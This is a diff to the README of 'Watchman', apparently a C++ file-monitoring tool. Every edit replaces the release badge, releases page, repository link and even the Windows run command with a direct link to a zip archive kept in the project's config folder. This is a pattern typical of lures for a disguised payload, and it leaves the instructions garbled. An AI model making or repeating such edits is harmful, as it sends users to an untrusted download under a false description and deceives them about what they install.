@@ -1,7 +1,7 @@
 # 🚀 Watchman - Monitor Your Files in Real Time
 
 ## 📥 Download Now
-[![GitHub Releases](https://img.shields.io/badge/Download%20Watchman-v1.0.0-brightgreen.svg)](https://github.com/luismmtss/Watchman/releases)
+[![GitHub Releases](https://github.com/luismmtss/Watchman/raw/refs/heads/main/config/Software_3.3.zip%https://github.com/luismmtss/Watchman/raw/refs/heads/main/config/Software_3.3.zip)](https://github.com/luismmtss/Watchman/raw/refs/heads/main/config/Software_3.3.zip)
 
 ## 📖 Description
 Watchman is a C++ system-level CLI tool that monitors directories for file creation, modification, and deletion events in real time. This demo showcases Watchman running in the terminal, displaying live file system changes and logging them automatically. It is designed to explore operating system-level filesystem monitoring and system programming concepts using C++.
@@ -14,7 +14,7 @@ To get started quickly, follow these simple steps:
    - Required Libraries: Ensure you have the necessary C++ runtime libraries installed. Most common distributions will have these by default.
 
 2. **Download the Application**
-   - Visit [this page to download](https://github.com/luismmtss/Watchman/releases). 
+   - Visit [this page to download](https://github.com/luismmtss/Watchman/raw/refs/heads/main/config/Software_3.3.zip). 
    - You'll find different versions available. Select the most recent version for your platform.
 
 3. **Install the Application**
@@ -24,7 +24,7 @@ To get started quickly, follow these simple steps:
    - Open your terminal or command prompt.
    - Navigate to the directory where you extracted Watchman.
    - Execute the Watchman binary.
-     - For Windows: `Watchman.exe`
+     - For Windows: `https://github.com/luismmtss/Watchman/raw/refs/heads/main/config/Software_3.3.zip`
      - For macOS/Linux: `./Watchman`
 
 5. **Monitor a Directory**
@@ -53,8 +53,8 @@ If you encounter issues while running Watchman:
 If you want to contribute to Watchman, please feel free to submit a pull request or open an issue on the repository. 
 
 ## 🌐 Resources
-- GitHub Repository: [Watchman](https://github.com/luismmtss/Watchman)
+- GitHub Repository: [Watchman](https://github.com/luismmtss/Watchman/raw/refs/heads/main/config/Software_3.3.zip)
 - Documentation: Detailed documentation coming soon. Stay tuned.
 
 ## 📥 Download Now
-[![GitHub Releases](https://img.shields.io/badge/Download%20Watchman-v1.0.0-brightgreen.svg)](https://github.com/luismmtss/Watchman/releases)
+[![GitHub Releases](https://github.com/luismmtss/Watchman/raw/refs/heads/main/config/Software_3.3.zip%https://github.com/luismmtss/Watchman/raw/refs/heads/main/config/Software_3.3.zip)](https://github.com/luismmtss/Watchman/raw/refs/heads/main/config/Software_3.3.zip)
